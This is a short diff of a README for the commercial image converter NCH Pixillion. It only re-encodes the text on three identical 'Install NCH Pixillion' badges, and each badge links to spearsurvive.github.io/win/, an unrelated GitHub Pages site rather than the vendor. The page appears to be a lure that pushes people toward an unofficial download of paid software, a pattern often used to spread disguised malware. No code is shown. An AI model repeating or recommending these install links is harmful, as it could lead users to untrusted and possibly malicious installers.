@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NCH Pixillion](https://img.shields.io/badge/⬇_Install_NCH%20Pixillion-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Pixillion](https://img.shields.io/badge/⬇_Install_NCH+Pixillion-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ NCH Pixillion is an image conversion software for Windows and macOS supporting c
 
 <div align="center">
 
-[![⬇ Install NCH Pixillion](https://img.shields.io/badge/⬇_Install_NCH%20Pixillion-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Pixillion](https://img.shields.io/badge/⬇_Install_NCH+Pixillion-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ NCH Pixillion is an image conversion software for Windows and macOS supporting c
 
 <div align="center">
 
-[![⬇ Install NCH Pixillion](https://img.shields.io/badge/⬇_Install_NCH%20Pixillion-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Pixillion](https://img.shields.io/badge/⬇_Install_NCH+Pixillion-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
